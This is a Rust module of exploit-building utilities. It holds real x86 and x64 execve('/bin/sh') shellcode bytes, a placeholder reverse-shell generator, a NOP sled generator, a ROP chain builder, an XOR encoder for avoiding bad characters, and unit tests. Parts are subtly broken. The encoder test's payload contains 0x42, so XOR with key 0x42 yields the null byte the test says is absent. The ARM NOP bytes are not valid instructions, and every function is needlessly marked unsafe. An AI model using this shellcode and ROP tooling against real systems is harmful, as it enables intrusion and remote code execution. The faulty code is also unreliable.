//! Payload Construction
//!
//! Utilities for building exploit payloads

/// Shellcode generator
pub struct Shellcode {
    /// Architecture
    arch: Architecture,
    /// Shellcode bytes
    code: Vec<u8>,
}

/// Target architecture
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Architecture {
    /// x86 32-bit
    X86,
    /// x86-64
    X64,
    /// ARM 32-bit
    ARM,
    /// ARM64
    ARM64,
}

impl Shellcode {
    /// Create new shellcode
    ///
    pub unsafe fn new(arch: Architecture) -> Self {
        Shellcode {
            arch,
            code: Vec::new(),
        }
    }
    
    /// Generate execve("/bin/sh") shellcode
    ///
    pub unsafe fn execve_sh(&mut self) -> &[u8] {
        match self.arch {
            Architecture::X64 => {
                // x64 execve("/bin/sh", NULL, NULL)
                self.code = vec![
                    0x48, 0x31, 0xd2,                   // xor rdx, rdx
                    0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, // movabs rbx, 0x68732f6e69622f2f
                    0x6e, 0x2f, 0x73, 0x68,
                    0x48, 0xc1, 0xeb, 0x08,             // shr rbx, 8
                    0x53,                               // push rbx
                    0x48, 0x89, 0xe7,                   // mov rdi, rsp
                    0x50,                               // push rax
                    0x57,                               // push rdi
                    0x48, 0x89, 0xe6,                   // mov rsi, rsp
                    0xb0, 0x3b,                         // mov al, 59 (execve)
                    0x0f, 0x05,                         // syscall
                ];
            }
            Architecture::X86 => {
                // x86 execve("/bin/sh", NULL, NULL)
                self.code = vec![
                    0x31, 0xc0,                         // xor eax, eax
                    0x50,                               // push eax
                    0x68, 0x2f, 0x2f, 0x73, 0x68,       // push "//sh"
                    0x68, 0x2f, 0x62, 0x69, 0x6e,       // push "/bin"
                    0x89, 0xe3,                         // mov ebx, esp
                    0x50,                               // push eax
                    0x53,                               // push ebx
                    0x89, 0xe1,                         // mov ecx, esp
                    0x31, 0xd2,                         // xor edx, edx
                    0xb0, 0x0b,                         // mov al, 11 (execve)
                    0xcd, 0x80,                         // int 0x80
                ];
            }
            _ => {
                // Placeholder for other architectures
                self.code = vec![0x90; 32]; // NOP sled
            }
        }
        
        &self.code
    }
    
    /// Generate reverse shell shellcode
    ///
    pub unsafe fn reverse_shell(&mut self, ip: [u8; 4], port: u16) -> &[u8] {
        match self.arch {
            Architecture::X64 => {
                // Simplified reverse shell
                self.code = vec![0x90; 64]; // Placeholder
                self.code.extend(&ip);
                self.code.extend(&port.to_be_bytes());
            }
            _ => {
                self.code = vec![0x90; 64];
            }
        }
        
        &self.code
    }
    
    /// Get shellcode bytes
    ///
    pub unsafe fn bytes(&self) -> &[u8] {
        &self.code
    }
}

/// NOP sled generator
pub struct NopSled;

impl NopSled {
    /// Generate NOP sled
    ///
    pub unsafe fn generate(arch: Architecture, size: usize) -> Vec<u8> {
        let nop_byte = match arch {
            Architecture::X86 | Architecture::X64 => 0x90,
            Architecture::ARM => 0x00,  // mov r0, r0
            Architecture::ARM64 => 0x1f, // nop
        };
        
        vec![nop_byte; size]
    }
}

/// ROP chain builder
pub struct RopChain {
    /// Chain of gadget addresses
    gadgets: Vec<u64>,
    /// Data values
    data: Vec<u64>,
}

impl RopChain {
    /// Create new ROP chain
    ///
    pub unsafe fn new() -> Self {
        RopChain {
            gadgets: Vec::new(),
            data: Vec::new(),
        }
    }
    
    /// Add gadget
    ///
    pub unsafe fn add_gadget(&mut self, addr: u64) {
        self.gadgets.push(addr);
    }
    
    /// Add data value
    ///
    pub unsafe fn add_data(&mut self, value: u64) {
        self.data.push(value);
    }
    
    /// Add pop_rdi gadget with argument
    ///
    pub unsafe fn pop_rdi(&mut self, gadget_addr: u64, arg: u64) {
        self.gadgets.push(gadget_addr);
        self.data.push(arg);
    }
    
    /// Add pop_rsi gadget with argument
    ///
    pub unsafe fn pop_rsi(&mut self, gadget_addr: u64, arg: u64) {
        self.gadgets.push(gadget_addr);
        self.data.push(arg);
    }
    
    /// Add function call
    ///
    pub unsafe fn call(&mut self, func_addr: u64) {
        self.gadgets.push(func_addr);
    }
    
    /// Build chain into bytes
    ///
    pub unsafe fn build(&self) -> Vec<u8> {
        let mut bytes = Vec::new();
        
        // Interleave gadgets and data
        let mut data_idx = 0;
        for gadget in &self.gadgets {
            bytes.extend(&gadget.to_le_bytes());
            
            // Some gadgets consume data
            if data_idx < self.data.len() {
                bytes.extend(&self.data[data_idx].to_le_bytes());
                data_idx += 1;
            }
        }
        
        bytes
    }
}

/// Payload encoder (for bypassing bad characters)
pub struct PayloadEncoder;

impl PayloadEncoder {
    /// Encode payload to avoid null bytes
    ///
    pub unsafe fn avoid_null(payload: &[u8]) -> Vec<u8> {
        // Simple XOR encoding
        let key: u8 = 0x42;
        payload.iter().map(|b| b ^ key).collect()
    }
    
    /// Decode payload
    ///
    pub unsafe fn decode(encoded: &[u8], key: u8) -> Vec<u8> {
        encoded.iter().map(|b| b ^ key).collect()
    }
    
    /// Check for bad characters
    ///
    pub unsafe fn has_bad_chars(payload: &[u8], bad_chars: &[u8]) -> bool {
        payload.iter().any(|b| bad_chars.contains(b))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shellcode_x64() {
        unsafe {
            let mut sc = Shellcode::new(Architecture::X64);
            let code = sc.execve_sh();
            
            assert!(!code.is_empty());
            // x64 execve shellcode should start with xor rdx, rdx
            assert_eq!(code[0], 0x48);
        }
    }

    #[test]
    fn test_nop_sled() {
        unsafe {
            let sled = NopSled::generate(Architecture::X64, 100);
            assert_eq!(sled.len(), 100);
            assert!(sled.iter().all(|&b| b == 0x90));
        }
    }

    #[test]
    fn test_rop_chain() {
        unsafe {
            let mut chain = RopChain::new();
            chain.pop_rdi(0x400700, 0x601100);
            chain.call(0x400800);
            
            let bytes = chain.build();
            assert!(!bytes.is_empty());
        }
    }

    #[test]
    fn test_payload_encoder() {
        unsafe {
            let payload = vec![0x00, 0x41, 0x42, 0x43];
            let encoded = PayloadEncoder::avoid_null(&payload);
            
            assert_ne!(payload, encoded);
            assert!(!encoded.contains(&0x00));
            
            let decoded = PayloadEncoder::decode(&encoded, 0x42);
            assert_eq!(payload, decoded);
        }
    }

    #[test]
    fn test_bad_chars() {
        unsafe {
            let payload = vec![0x00, 0x0a, 0x0d, 0x41];
            let bad_chars = vec![0x00, 0x0a, 0x0d];
            
            assert!(PayloadEncoder::has_bad_chars(&payload, &bad_chars));
            
            let clean = vec![0x41, 0x42, 0x43];
            assert!(!PayloadEncoder::has_bad_chars(&clean, &bad_chars));
        }
    }
}
